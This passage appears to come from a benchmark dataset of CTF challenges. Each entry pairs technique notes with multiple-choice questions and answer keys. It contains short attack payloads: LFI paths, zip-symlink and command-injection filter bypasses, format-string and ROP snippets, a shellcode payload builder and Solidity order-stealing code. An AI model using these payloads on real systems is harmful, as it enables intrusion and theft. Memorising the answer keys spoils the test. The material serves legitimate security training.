            "https://ctftime.org/event/1014/tasks/"
        ],
        "score": 983,
        "max_score": 998,
        "difficulty": 0.9849699398797596,
        "knowledge": [
            "In challenges using encryption based on the `rand()` function seeded with time or predictable values, one can reverse the encryption if the seed value can be predicted or narrowed down. For example, if the encryption uses the current time as a seed, one could brute-force seed values around the known time frame of encryption to find the correct seed, and thereby decrypt the encrypted data. This method requires knowledge of the encryption algorithm and any part of the original plaintext (such as a known plaintext attack).\n    \n    Sample approach for decryption:\n    - Using the known plaintext (`hexctf` in this case), iterate through possible `time_t` seed values that could have been used to seed `rand()`.\n    - Reverse the encryption process using each seed to generate the decryption key.\n    - Match the output against the known plaintext to find the correct seed.",
            "When handling binaries that are stripped of symbols and debug information, determining the functionality of parts of the binary relies on recognizing patterns of interaction with known library calls or system functions. In static binaries where functions like `fgets`, `fputc`, and `rand` are used without their symbolic names, identifying these functions can be achieved by analyzing the parameters and behavior in the decompiled or disassembled code and mapping these to known functions from the standard `libc`. This approach facilitates understanding complex binaries and deducing their logic for reverse engineering tasks.\n\n    No specific sample payload is necessary for this point, as it describes a methodology for reverse engineering rather than a direct solution or exploit code."
        ],
        "question": [
            "In a reversing challenge that involves a pseudo-encryption algorithm using `rand()` seeded with the current time, a specific method for decrypting the data involves knowing a piece of the plaintext. Assuming the encryption process employs `rand()` seeded with `time(NULL)` and XORs each byte of the plaintext with a pseudo-random number generated by `rand()`, which of the following approaches would allow for the decryption of this data if a portion of the plaintext is known? - A. Iterating through `rand()` seeds starting from an arbitrary point in the future and moving forward. - B. Matching the encrypted data against a dictionary of commonly used passwords. - C. Utilizing a differential cryptanalysis attack to exploit the linear characteristics of the cipher. - D. Iterating through possible `time_t` values from the timestamp of the encryption, reversing the encryption process using each seed to regenerate the plaintext, and checking against the known plaintext.",
            "When faced with a stripped, statically linked binary in a reverse engineering task, which involves identifying standard library functions (`libc`) by their behavior without symbolic names, what is the most effective strategy for determining the functionality of specific parts of the binary? - A. Guessing the purpose of each function based on the number of arguments it takes. - B. Analyzing the parameters and interactions with known system calls or standard library functions to map them to known `libc` functions. - C. Utilizing automatic signature recognition tools to instantly identify all functions without manual analysis. - D. Renaming every unidentified function to a random string and assuming a general purpose for each."
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Nano",
        "write_up": "dataset/raw/Nano.md",
        "type": "web",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 489,
        "max_score": 500,
        "difficulty": 0.978,
        "knowledge": [
            "When facing a Local File Inclusion (LFI) challenge where the script includes a file based on a GET request parameter without sufficient input validation, you can access arbitrary files on the server, especially when dealing with scripts that handle file operations (open/close). If the script opens a file before the inclusion occurs, you can attempt to include and read files via file descriptors located in `/dev/fd/` by bruteforcing or guessing the file descriptor number. This method is particularly useful when direct access to files is restricted or not directly possible.  \nExample payload: `?flag_help=../../../../../dev/fd/10`",
            "In challenges involving file uploads, when the application does not validate or improperly validates the content of ZIP archives, you can exploit this by creating a ZIP archive containing symlinks to target directories or files on the server. This allows for arbitrary file access or directory traversal attacks if the application extracts the ZIP's contents to a publicly accessible directory. This technique can bypass restrictions on direct file uploads or direct file access.  \nExample payload ZIP creation command: `ln -s /target/file/or/directory symlink_name && zip --symlinks exploit.zip symlink_name`"
        ],
        "question": [
            "During a Local File Inclusion (LFI) exploitation, if there is a PHP script that includes a file based on a GET request\u2019s parameter, which among the following would be a valid method to read a file through file descriptor located in `/dev/fd/`? - A. Modifying the request to `?page=index.html` in hopes of directory traversal. - B. Using the request `?flag_help=/etc/passwd` to directly include sensitive files. - C. Adjusting the request to `?flag_help=../../../../../dev/fd/10` for exploiting file descriptor access. - D. Sending a request with `?flag_help=php://filter/convert.base64-encode/resource=index.php` to bypass restrictions. ",
            "In a scenario where a web application extracts the contents of uploaded ZIP files without validating if they contain symlinks, which command would correctly exploit this vulnerability to access arbitrary server files or directories? - A. `cp /target/file/or/directory exploit.zip` - B. `ln -s /target/file/or/directory symlink_name && zip --symlinks exploit.zip symlink_name` - C. `tar -czvf exploit.tar.gz /target/file/or/directory` - D. `zip exploit.zip /target/file/or/directory` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "nanovm",
        "write_up": "dataset/raw/nanovm.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 350,
        "max_score": 400,
        "difficulty": 0.875,
        "knowledge": [
            "In challenges involving nested binaries, with one binary containing another for a different architecture, it's essential to analyze the host binary to understand its interaction with the nested binary. This often involves identifying specific functions the host binary uses to communicate or manipulate the nested binary, such as sending APDU commands in the described scenario. This knowledge is vital for understanding the overall functionality and for identifying potential points of interaction or vulnerability.",
            "When faced with a cryptographic challenge implementing CBC mode encryption without direct access to a decryptor, reverse engineering and modifying the binary's logic to switch from encryption to decryption mode can be a successful strategy. This might involve identifying and altering specific instructions within the binary (e.g., changing an \"xor\" instruction that zeroes out a register to a \"nop\" instruction to maintain a register's value) to manipulate the program's flow or data processing behavior, effectively turning an encryption routine into a decryption one without needing to decrypt explicitly. This approach requires a detailed analysis of the binary's operation, particularly the cryptographic routine's implementation details. \n\n   Sample modification to switch modes: Replace the instruction setting a variable to zero (effectively an encrypt mode indicator) with a NOP instruction to retain a nonzero value, thereby switching to decrypt mode (assuming such a mode exists as implied by the binary's logic). The key here is understanding the binary's internal logic and finding a way to invert or bypass the encryption process."
        ],
        "question": [
            "In a cybersecurity challenge involving a host binary that manages communications with a nested binary of a different architecture, which function call is crucial for sending properly formatted data packets to control the nested binary?  - A. A function that calculates the MD5 hash of input data. - B. A function at `403E30` that takes `argv[1]` and performs several nested loops and communications. - C. A simple print statement function. - D. A function that solely increments a counter based on user input. ",
            "When trying to invert a CBC mode encryption mechanism implemented in a binary, without having access to a decryption routine, what technique could be effective for altering the binary's behavior from encryption to potentially mimic decryption?  - A. Increasing the size of the input buffer to overflow the encryption routine. - B. Changing a function call that sends data to simply log the data instead. - C. Replacing an \"xor with zero\" instruction (which effectively sets a register's value to zero) with a \"nop\" (no operation) instruction to bypass resetting a critical value. - D. Renaming variables within the binary to confuse the encryption logic. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Naughty",
        "write_up": "dataset/raw/Naughty.md",
        "type": "pwn",
        "competition": [
            "OverTheWireAdventBonanza/2018",
            "https://ctftime.org/event/721/tasks/"
        ],
        "score": -1.0,
        "max_score": 400,
        "difficulty": -1,
        "knowledge": [
            "In format string vulnerabilities where direct exploitation (such as leaking libc addresses or overwriting GOT entries) is initially not feasible due to application structure or security protections, indirect methods can be utilized. One technique involves overwriting pointers or hooks that are executed upon application exit or error handling (for example, entries in the .fini_array section or error functions like `__stack_chk_fail`). This allows for the redirection of the program's execution flow to a desired function, such as `main`, enabling repeated exploitation attempts or further manipulation of the program's state. This strategy requires the program to lack PIE protection, making specific memory addresses predictable.\n   \n   Example payload for overwriting .fini_array to rerun main: `fmtstr_payload(offset, {fini_array_address: address_of_main})`.",
            "When dealing with remote exploitation challenges, especially when targeting functions like `system` to execute arbitrary commands, it's critical to accurately determine the version and base address of the libc being used remotely. This often involves leaking addresses of known libc functions or objects (e.g., `_IO_2_1_stdin_`) and using tools or databases to identify the specific libc version. Once identified, this information can be leveraged to calculate offsets to other libc functions (such as `system`) within the same remote environment. The accurate libc base address is crucial for crafting payloads that dynamically calculate the addresses of libc functions in memory.\n   \n   Sample payload segment for libc leak and system address calculation: \n   ```\n   leak = int(recv_until_marker, 16)\n   libc_base = leak - libc.symbols['_IO_2_1_stdin_']\n   system_address = libc_base + libc.symbols['system']\n   ```"
        ],
        "question": [
            "When executing an exploit for a format string vulnerability, why might an attacker choose to overwrite an entry in the `.fini_array` using a payload such as `fmtstr_payload(offset, {fini_array_address: address_of_main})`?  - A. To directly print the contents of the stack on the screen for debugging purposes. - B. To cause the application to execute the main function again upon termination, allowing for repeated exploitation attempts. - C. To increase the efficiency of memory allocation by the application. - D. To create a new function within the application's memory space. ",
            "In a remote exploitation challenge, how can an attacker determine the base address of the libc being used remotely to properly craft an exploit payload targeting the `system` function?  - A. By hardcoding the libc base address assumed from local testing. - B. By sending multiple NOP-sled payloads until the correct address is guessed. - C. Leaking an address of a known libc function or object (e.g., `_IO_2_1_stdin_`), then using tools or databases to identify the libc version and calculating the base address. - D. Requesting the libc version directly from the application using a custom payload. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "nDLP",
        "write_up": "dataset/raw/nDLP.md",
        "type": "crypto",
        "competition": [
            "ASIS/2021/Finals",
            "https://ctftime.org/event/1416/tasks/"
        ],
        "score": 218,
        "max_score": 953,
        "difficulty": 0.22875131164742918,
        "knowledge": [
            "When faced with a discrete logarithm problem where the modulus `n` is composite and not prime, solving it directly can be challenging. In such cases, one approach is to use factorization to find the prime factors of `n`. After factorization, one can solve the discrete logarithm problem for each prime factor separately and then apply the Chinese Remainder Theorem to find the original discrete logarithm. This is a theoretical approach which may not be feasible for large numbers or in practical CTF scenarios due to computational constraints.",
            "A more practical approach to solving discrete logarithm problems, especially when `n` is composite, is to use specialized online tools like Alpertron which can handle composite numbers directly. For using Alpertron to solve a discrete logarithm problem, input `g` as `Base`, `y` as `Power`, and `n` as `Modulus` in the tool's interface. This approach is effective for CTF challenges because it bypasses the need for computational resources and deep mathematical understanding of discrete logarithms or the Chinese Remainder Theorem. \n   \n   Example input for Alpertron:\n   - Base (`g`): 685780528648223163108441\n   - Power (`y`): 9136134187598897896238293762558529068838567704462064643828064439262538588237880419716728404254970025\n   - Modulus (`n`): 12588567055208488159342105634949357220607702491616160304212767442540158416811459761519218454720193189"
        ],
        "question": [
            "When addressing a discrete logarithm problem (DLP) in which the modulus `n` is not a prime number, making the problem computationally challenging, what technique can be theoretically applied before resorting to online tools for a solution? - A. Apply the RSA algorithm to reduce the complexity of `n`. - B. Factorize `n` into its prime factors, solve the DLP for each factor, and then use the Chinese Remainder Theorem (CRT) to combine these solutions. - C. Increase the value of `g` to make `n` seem prime. - D. Convert `n` from composite to prime by removing non-prime factors dynamically. ",
            "In the context of solving DLPs where the modulus `n` is composite for CTF challenges, which is the recommended practical solution to bypass computational and theoretical challenges? - A. Manually solving the DLP through iterative brute force. - B. Using a quantum computer emulator to solve the DLP. - C. Using an online tool like Alpertron by inputting `g` as `Base`, `y` as `Power`, and `n` as `Modulus`. - D. Implementing the Elliptic Curve Cryptography (ECC) method to reduce the complexity of the problem. "
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "nemoji",
        "write_up": "dataset/raw/nemoji.md",
        "type": "pwn",
        "competition": [
            "HXP/2020",
            "https://ctftime.org/event/1134/tasks/"
        ],
        "score": 455,
        "max_score": 1000,
        "difficulty": 0.455,
        "knowledge": [
            "In challenges where you have very constrained code execution space and need to execute arbitrary shellcode, leveraging Return-Oriented Programming (ROP) gadgets within the program or the payload itself can be a viable strategy. Specifically, if the executable space (including NOP slides) and control over certain registers are given, constructing a payload that manipulates the instruction pointer to execute a sequence leading to your shellcode is effective. Utilizing instructions like `call qword ptr [reg + offset]` can redirect execution flow when combined with controlled data segments. The conditions include having control over a register like RAX to point to an executable address crafted or influenced by the attacker.",
            "When a binary involves randomized memory mapping (mmap) which affects where shellcode or critical data can be placed, and the randomness or pattern can be influenced or predicted, performing a bruteforce attack to hit a specific memory address can be instrumental in gaining code execution. This technique relies on the ability to repeatedly attempt memory mappings until obtaining an address that suits the exploitation strategy, such as mapping the shellcode to an address that will be called due to the manipulated execution flow. This strategy requires the attacker to have the ability to invoke the mmap() call multiple times without crashing the program or losing control, and effectively means predicting or influencing where the memory mapping will occur.\n\nSample Payload Construction Approach:\n- Attempt to mmap a specific address conducive to the attack (e.g., 0x6F3E4000).\n- Construct payload segments around expected memory layouts and executable segments, incorporating NOP sleds if necessary to align the shellcode.\n- Utilize adjusted registers and offsets to navigate the execution flow towards the shellcode or ROP gadgets.\n\n```python\n# Example of mmap bruteforce and payload setup\nwhile True:\n    mmap = beer()  # Attempt to get a specific mmap address\n    if mmap == 0x6F3E4000:  # Target address achieved\n        break\n\n# Crafting the payload\npayload = asm(shellcraft.amd64.sh(),arch='amd64')  # Shellcode segment\npayload += b'\\x90' * (512 - len(payload))  # NOP sled to align with executable segment\npayload += b'\\x67\\xFF'  # Instruction to manipulate control flow\npayload += b'\\x90' * (3967 - len(payload))  # Additional padding to reach specified address\npayload += b'\\x00\\x40\\x3E\\x6F\\x00\\x00\\x00\\x00'  # Address to redirect execution to\npayload += b'\\x90' * (4096 - len(payload))  # Final payload size adjustment\n```\nThis approach involves constructing a payload that exploits the control flow manipulation technique and the specific memory mapping to execute arbitrary code effectively."
        ],
        "question": [
            "In a scenario where extremely limited code execution space is available, and one aims to execute arbitrary shellcode, which technique can be effectively employed if the attacker has control over some registers including RAX, and NOP slides are present in the executable space? - A. Use a series of mixed data and executable commands aiming to confuse the malicious payload detection systems. - B. Embed a large set of NOP sleds followed by a sequence of unaligned shellcode bytes without ensuring register control. - C. Leverage an instruction like `call qword ptr [RAX+offset]` to manipulate the instruction pointer towards executing the shellcode, given RAX points to a controllable address. - D. Focus solely on heap spraying to increase the probability of hitting the NOP slide without considering register controls or the executable memory address.",
            "Given a binary challenge involving randomized memory mapping which affects shellcode placement, if certain conditions allow, what strategy can lead to successful code execution through obtaining a specific memory address? - A. Ignoring the memory mapping randomness by focusing exclusively on stack-based overflow techniques without any memory mapping consideration. - C. Solely relying on static analysis to guess where the memory will be mapped without actually influencing or predicting the mapping. - B. Executing a bruteforce attack to repeatedly attempt memory mappings until an address like 0x6F3E4000 is achieved, suitable for the exploitation strategy. - D. Attempting to overflow global variables to corrupt memory mapping functions indirectly without controlling the specific mmap address."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Network Pong",
        "write_up": "dataset/raw/Network Pong.md",
        "type": "web",
        "competition": [
            "Sunshine/2022",
            "https://ctftime.org/event/1629/tasks/"
        ],
        "score": 100,
        "max_score": 150,
        "difficulty": 0.6666666666666666,
        "knowledge": [
            "When facing shell command injection vulnerabilities in an environment where space characters trigger an error, it is possible to inject commands using the format `}{command;{`. This technique circumvents restrictions that prevent the direct use of spaces in injected commands. Example payload: `google.com};ls;{`",
            "If specific commands or keywords are filtered out by a blacklist (e.g., the word \"cat\" is not allowed), escaping the characters of the blocked command may bypass this filter. This tactic involves adding a backslash (`\\`) before each character in the command to neutralize the filter's effect. Example payload: `google.com};{c\\at,flag.txt`"
        ],
        "question": [
            "In a web application vulnerable to command injection, an error is triggered when space characters are used in input fields. You want to execute the list command without triggering the error. Which of the following payloads would allow you to bypass the space restriction and successfully inject the command?  - A. `domain.com ls` - B. `domain.com;{ls}` - C. `domain.com};ls;{` - D. `domain.com|ls` ",
            "During a security assessment, you discover that a web application filters out the use of the `cat` command, likely as part of a blacklist mechanism to prevent command injection. Which of the following payloads could allow you to bypass this filter and execute the `cat flag.txt` command?  - A. `domain.com};{cat,flag.txt` - B. `domain.com};{c\\at,flag.txt` - C. `domain.com};echo flag.txt` - D. `domain.com;cat flag.txt` "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "NeutronMail",
        "write_up": "dataset/raw/NeutronMail.md",
        "type": "crypto",
        "competition": [
            "LakeCTF/2022",
            "https://ctftime.org/event/1728/tasks/"
        ],
        "score": 416,
        "max_score": 488,
        "difficulty": 0.8524590163934426,
        "knowledge": [
            "When dealing with encrypted messages in CTF challenges, specifically using RSA encryption, if direct factorization of the public modulus fails, a useful strategy might involve finding related keys with insufficient entropy during generation. Comparing the public modulus of these related keys using the Greatest Common Divisor (GCD) method can reveal a nontrivial factor leading to the discovery of private key components (`p`, `q`, `d`, `u`). This approach relies on the chance that related keys were generated with overlapping prime numbers due to insufficient randomness.",
            "In CTF challenges involving decryption with patched or custom tools, when you have a mismatch between the expected signature of the encrypted message and the signature generated by your decryption attempt, it's essential to manually adjust the signature in the decryption tool based on the encrypted message's signature. This may involve modifying the decryption library to accept the extracted signature from the encrypted message, ensuring the successful decryption of the message using the reconstructed private key. This process requires knowledge of the encryption algorithm's internals and how the tool implements its functionality. \n\n   Sample of manual patch in pseudo-code (based on above context, not directly executable):\n   ```python\n   # Assuming pgpy.PGPKey is the class handling the key operation\n   def patch_pgpy_with_priv_numbers(p, q, d, u):\n       # Generate a new PGP key based on RSA Encrypt or Sign with specified modulus size (e.g., 4096 bits)\n       # and replace its components with the factored `p`, `q`, `d`, and `u`\n       new_key = pgpy.PGPKey.new(PubKeyAlgorithm.RSAEncryptOrSign, 4096)\n       new_key._key.p = p\n       new_key._key.q = q\n       new_key._key.d = d\n       new_key._key.u = u\n       return new_key\n   \n   # Patch the library to use a specific signature for the newly generated key\n   def patch_signature(key, signature):\n       # Directly set the signature attribute of the key to match the expected one\n       key.signature = signature\n   ```"
        ],
        "question": [
            "In a CTF challenge where RSA encryption is used, and direct factorization of a public modulus is not feasible due to its size, what alternative method can be used to potentially find the private key components when suspecting related keys have been generated with insufficient entropy? - A. Increase the computational power for direct factorization. - B. Compare the public modulus of related keys using the Greatest Common Divisor (GCD) method to find a nontrivial factor. - C. Generate random primes until one matches the public modulus. - D. Use a standardized RSA decryption tool without any modifications to factor the modulus.",
            "In a scenario where you need to decrypt a PGP encrypted message for a CTF challenge and you've discovered a mismatch between the signature expected by the decryption tool and the signature of the encrypted message, what step must be taken to ensure successful decryption using a patched decryption tool? - A. Completely ignore the signature mismatch and proceed with decryption. - B. Reverse-engineer the encryption algorithm to remove the need for a signature. - C. Manually adjust the signature in the decryption tool based on the encrypted message's signature to match. - D. Increase the encryption key size to bypass the signature check."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "newphonewhodis",
        "write_up": "dataset/raw/newphonewhodis.md",
        "type": "reverse",
        "competition": [
            "C3CTF/2018",
            "https://ctftime.org/event/718/tasks/"
        ],
        "score": 451,
        "max_score": 500,
        "difficulty": 0.902,
        "knowledge": [
            "When exploiting a binary by sending crafted payloads over a limited interaction interface, such as SMS in a GSM network, consider protocol features like multi-part messages to construct the necessary payload for buffer overflow or similar vulnerabilities. Specifically, use the User Data Header (UDH) of concatenated SMS to control message segmentation and sequence, which can be exploited to write outside the intended buffer. This technique is particularly useful in cases where direct interaction with the vulnerable application is not possible, but indirect interaction (such as over SMS or other protocol-based communication) can be used to trigger the vulnerability.\n\nExample payload structure (simplified):\n```python\ndef encode_part(ref_num, data, CSMS=0x17, max_part=3):\n    header = \"\\x05\\x00\\x03\" + chr(CSMS) + chr(max_part) + chr(ref_num)\n    return header + data\n\npayload_data = \"crafted_binary_data_here\"\nsms_payload = encode_part(1, payload_data, CSMS=0x01, max_part=3)  # Example for part 1 of 3\n```",
            "In scenarios where direct memory manipulation is needed to exploit a vulnerability, but standard exploitation tactics (like a second-stage payload delivery via network interaction) are not viable, consider using a Return-Oriented Programming (ROP) chain to manipulate memory directly such as invoking `mmap` to allocate executable memory space and then writing shellcode into that space. This method requires finding suitable gadgets within the binary or loaded libraries, constructing a chain that sequences these gadgets to perform desired memory operations, and finally executing arbitrary code.\n\nExample ROP chain construct (simplified):\n```python\n# Assuming gadgets and addresses are already determined\nrop_chain = [\n    p32(gadget_pop_r4_pc),  # Gadget to control r4 register\n    p32(shellcode_address),  # Address where the shellcode will be written\n    p32(gadget_write_r4_to_r3_address),  # Gadget for writing data from r4 to [r3]\n    # Repeat as needed to construct the full payload in memory\n    p32(jump_to_shellcode_address)  # After writing, jump to the shellcode's address\n]\n```\nThis strategy is often used when exploiting binaries on systems with protections like ASLR and NX, but where a direct second stage payload delivery is not straightforward due to the exploitation environment constraints (e.g., no direct network interaction with the target application)."
        ],
        "question": [
            "In an exploitation scenario where direct interaction with the target application is not possible, and payload delivery must happen through SMS over a GSM network, how can one utilize multi-part messages to bypass payload size restrictions and potentially exploit a buffer overflow vulnerability?  - A. Construct a single SMS with encoded binary payload directly targeting the overflow. - B. Utilize the User Data Header (UDH) in concatenated SMS to control message segmentation and sequence for payload delivery. - C. Increase the SMS message size limit via AT commands to send a larger payload in one part. - D. Encrypt the payload to compress its size, fitting it within a single SMS message limit. ",
            "When exploiting a binary where traditional exploitation methods like second-stage payload delivery are not viable, which technique involves manipulating memory directly to allocate executable space and execute arbitrary code, especially on systems with ASLR and NX enabled?  - A. Execute a brute-force attack to guess the address of system() and call it directly. - B. Construct a ROP chain to perform buffer overflow and directly jump to the shellcode placed in memory. - C. Use a ROP chain to call `mmap` to allocate executable memory, and then write and execute shellcode in the allocated space. - D. Modify the binary in memory to disable NX and ASLR, allowing direct execution of injected shellcode. "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "NewPwd",
        "write_up": "dataset/raw/NewPwd.md",
        "type": "web",
        "competition": [
            "watevrCTF/2019",
            "https://ctftime.org/event/893/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing a challenge that involves brute-forcing a login page protected by captchas, examine the session cookie for any values that might hint at bypassing or simplifying the captcha mechanism. For instance, if the session cookie includes values that differentiate captcha types, exploit this by collecting multiple instances of each type to analyze and identify common noise and patterns. This can lead to the development of a method to systematically remove or bypass the captcha, significantly reducing the complexity of brute-forcing the password. This approach is particularly useful in scenarios where captchas are the main barrier to automated login attempts.",
            "In captcha-solving challenges where each character within a captcha is significantly distorted in a consistent manner (translated and rotated), divide the captcha into equal parts based on the number of characters and compare these against a database of manually labeled, cleanly extracted characters. The comparison should focus on identifying the closest match by counting the disparities in expected versus actual pixel coloration, particularly looking for areas where a clear image has a black pixel but the captcha character does not. This methodology is applicable in scenarios where captchas are designed with a consistent distortion pattern for each character, allowing for a high accuracy rate in automated captcha solving through pattern recognition and pixel analysis."
        ],
        "question": [
            "In a cybersecurity challenge involving brute-force attacks against a login page protected by captchas, the approach of examining a session cookie revealed that it includes a `captcha_type` value, suggesting a strategy to bypass the captcha mechanism. What is the technique to simplify solving the captchas based on this information? - A. Generate random guesses until a captcha is correctly solved without analyzing the session cookie. - B. Submit a large number of incorrect captcha answers to force the system to offer simpler captchas. - C. Collect and analyze multiple instances of each captcha \"type\" identified by the session cookie to find common noise and patterns, which can then be systematically removed. - D. Ignore the session cookie and repeatedly refresh the captcha until an easy one appears.",
            "In an attempt to automatically solve captchas that feature characters consistently distorted by translation and rotation, what method should be employed to achieve high accuracy in character recognition? - A. Treat the entire captcha as a single image and compare it to a standard alphabet set. - B. Divide the captcha into equal parts corresponding to each character, manually label cleanly extracted characters for each part, and identify the closest match by comparing disparities in expected versus actual pixel coloration. - C. Use a single character example for each letter and number, and apply a general averaging filter to each captcha section before comparison. - D. Convert the captcha images to grayscale and apply a basic OCR tool without preprocessing or segmentation."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "NFT Marketplace",
        "write_up": "dataset/raw/NFT Marketplace.md",
        "type": "crypto",
        "competition": [
            "Balsn/2022",
            "https://ctftime.org/event/1697/tasks/"
        ],
        "score": 358,
        "max_score": 381,
        "difficulty": 0.9396325459317585,
        "knowledge": [
            "When interacting with smart contracts in a CTF challenge involving an NFT marketplace, it is possible to precompute contract addresses before they are deployed if their creation code, nonce, and deploying address are known. This allows for the prediction of contract addresses and the possibility to interact with them before their actual deployment on the blockchain. This technique takes advantage of the deterministic nature of contract address generation in Ethereum, which relies on the address that is deploying the contract and the nonce (the number of transactions sent from that address).\n\n    - To precompute a contract address, you can use the formula involving the sender's address (deployer), nonce, and the bytecode of the contract being deployed. This can be achieved through the use of the `keccak256` hashing function on the concatenation of bytecode and specific inputs:\n    ```solidity\n    bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), _target, keccak256(\"UniqueIdentifier\"), keccak256(getBytecode(_target))));\n    return address(uint160(uint(hash)));\n    ```",
            "In a DeFi/ERC20/ERC721-related CTF challenge, if the functionality to create orders or transactions before the initialization of a marketplace or financial contract is not properly restricted, it can be exploited by crafting orders or transactions against expected future states of the contract. This allows for manipulation or theft of tokens (NMTokens in this scenario) or assets (like NFTs) by taking advantage of the uninitialized state of the contract.\n\n    - Before the contract is initialized, create orders for transferring assets (NMTokens or NFTs) that you do not own yet or for currently nonexistent tokens with the assumption that these assets will exist post-initialization. This relies on the logic flaw where checks on ownership or existence are ineffective or bypassed due to the contract's uninitialized state. After the contract initializes and the assets come into existence, these pre-made orders can be fulfilled, allowing for an unauthorized acquisition of assets.\n    ```solidity\n    // Pre-initialization phase: Crafting orders for future assets\n    marketplace.createOrder(nmtoken_addr, 1000000, 0);  // Steal NMTokens\n    marketplace.createOrder(rarenft_addr, 1, 0);        // Steal NFT id 1\n    marketplace.createOrder(rarenft_addr, 2, 0);        // Steal NFT id 2\n    marketplace.createOrder(rarenft_addr, 3, 0);        // Steal NFT id 3\n\n    // Post-initialization phase: Fulfilling the crafted orders\n    marketplace.initialize();\n    marketplace.fulfill(0);\n    marketplace.fulfill(1);\n    marketplace.fulfill(2);\n    marketplace.fulfill(3);\n    ```"
        ],
        "question": [
            "In the context of smart contract interactions within CTF challenges, a technique involves precomputing the addresses of contracts before they are deployed using specific information. Given this scenario, which Solidity code snippet correctly demonstrates how to precompute the address of a contract that hasn\u2019t been deployed yet, based on the deploying address, nonce, and contract\u2019s creation bytecode?  - A. `address(uint160(uint(keccak256(abi.encodePacked(_target, nonce, bytecode)))));` - B. `address(uint160(uint(hash)));` - C. `address(uint256(keccak256(abi.encodePacked(bytecode, _target))));` - D. `address(uint160(uint(keccak256(abi.encodePacked(bytes1(0xff), _target, keccak256(\"UniqueIdentifier\"), keccak256(getBytecode(_target))))));` ",
            "In challenges involving DeFi/ERC20/ERC721, an exploit exists where participants can manipulate the initial state of a contract to their advantage. Given the following scenario, what illustrates this exploit method where transactions or orders are created prior to the initialization of a marketplace or financial contract, henceforth manipulating or acquiring tokens or assets post-initialization unfairly?  - A. `marketplace.transferOwnership(msg.sender);` - B. `marketplace.deploy(abi.encodePacked(bytecode, _target));` - C. ``` marketplace.createOrder(nmtoken_addr, 1000000, 0); marketplace.createOrder(rarenft_addr, 1, 0); marketplace.createOrder(rarenft_addr, 2, 0); marketplace.createOrder(rarenft_addr, 3, 0); marketplace.initialize(); ``` - D. `marketplace.initialize(); marketplace.transfer(nmtoken_addr, 1000000);` "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "nibelung",
        "write_up": "dataset/raw/nibelung.md",
        "type": "crypto",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 525,
        "max_score": 755,
        "difficulty": 0.695364238410596,
        "knowledge": [
            "When facing encryption schemes that rely on algebraic structures, identifying the correct structure (Group, Ring, Field) can lead to insights on potential vulnerabilities. In this challenge, recognizing the structure as a Ring instead of a Group reveals that both addition and multiplication operations are defined and can be exploited. This identification is crucial for strategizing attacks, especially in scenarios where the encryption seems homomorphic, allowing operations to happen on encrypted data similar to how they would on plaintext. This knowledge is universally applicable for challenges where the underlying algebraic structure can be exploited for attacks.",
            "In scenarios where direct decryption of encrypted data is not feasible due to limitations (such as data size restrictions), employing a blinding attack by breaking down the problem can be an effective strategy. In this challenge, the encrypted flag is split into smaller, manageable parts that comply with the server's limits, decrypted individually, and then reassembled. This approach leverages the homomorphic properties of the encryption scheme, where operations applied to encrypted data are preserved after decryption. This technique can be universally applied to circumvent limitations by working on a per-element basis and exploiting homomorphism to reconstruct the original data.\n\nExample payload for a single cell decryption, focusing on splitting the value into manageable chunks:\n\n```python\n# Assuming function dec_oracle sends our payload to the server and returns the decrypted matrix\ndef single_cell_decryption_example(i, j, val, n, p, dec_oracle):\n    k = val // 255\n    remainder = val % 255\n    payload_255 = ['\\0'] * (n * n)\n    payload_255[i * n + j] = chr(255)\n    decrypted_255_component = dec_oracle(\"\".join(payload_255))\n    \n    payload_remainder = ['\\0'] * (n * n)\n    payload_remainder[i * n + j] = chr(remainder)\n    decrypted_remainder_component = dec_oracle(\"\".join(payload_remainder))\n    \n    # Recombine the decrypted parts to get the original value\n    # Additional operations to integrate decrypted components back into the matrix would be needed\n    pass  # Pseudocode placeholder for recombination logic\n\n# Note: This is a simplified snippet to illustrate the approach. Actual implementation will involve converting decrypted results back into the appropriate algebraic structure.\n```"
        ],
        "question": [
            "Which of the following algebraic structures allows for both addition and multiplication operations, making it crucial to identify for strategizing encryption or decryption in cryptography challenges? - A. Field - B. Group - C. Ring - D. Monoid ",
            "In a scenario where the server's limitation only allows encrypting or decrypting matrices with elements in the range of 0 to 255, which technique can effectively decrypt a larger element through separate operations and recombination, leveraging the homomorphic property of the encryption scheme? - A. Modulus operation attack - B. Blinding attack - C. Replay attack - D. Differential cryptanalysis "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "NLFSR",
        "write_up": "dataset/raw/NLFSR.md",
        "type": "crypto",
        "competition": [
            "De1CTF/2020",
            "https://ctftime.org/event/1033/tasks/"
        ],
        "score": 235,
        "max_score": 1000,
        "difficulty": 0.235,
        "knowledge": [
            "When analyzing a Non-Linear Feedback Shift Register (NLFSR) in cryptographic challenges, identify a strong correlation between the output and one of the inputs by calculating the truth table for the NLFSR equation. This approach is effective when the output significantly depends on the state of specific inputs, allowing for the deduction of input values with high probability.",
